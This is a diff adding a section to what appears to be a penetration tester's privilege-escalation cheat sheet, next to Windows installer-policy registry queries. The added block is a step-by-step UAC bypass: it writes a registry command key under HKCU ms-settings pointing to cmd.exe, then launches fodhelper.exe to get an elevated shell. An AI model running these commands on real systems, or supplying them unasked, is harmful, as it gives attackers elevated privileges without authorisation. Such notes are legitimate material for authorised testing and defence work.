@@ -15,6 +15,14 @@ mountvol
 ##### Enumerating Binaries That AutoElevate
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+##### Bypass UAC
+```
+1. check C:\Windows\System32\fodhelper.exe
+2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+3. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+5. run fodhelper.exe, whoami /groups
+```
 
 ### Linux
 ##### Kernel exploits
